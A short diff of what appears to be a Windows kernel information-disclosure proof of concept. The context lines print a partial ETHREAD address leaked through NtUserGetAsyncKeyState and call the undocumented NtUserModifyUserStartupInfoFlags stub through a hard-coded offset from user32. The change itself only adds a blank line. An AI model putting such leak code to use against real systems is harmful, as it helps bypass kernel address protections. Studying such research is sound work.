@@ -48,6 +48,7 @@ int main()
 	}
 #endif
 	printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%X\r\n", ethread);
+	
 	lNtUserModifyUserStartupInfoFlags pNtUserModifyUserStartupInfoFlags = (lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32 + NtUserModifyUserStartupInfoFlagsAddress);
 
 	pNtUserModifyUserStartupInfoFlags(20, 12);
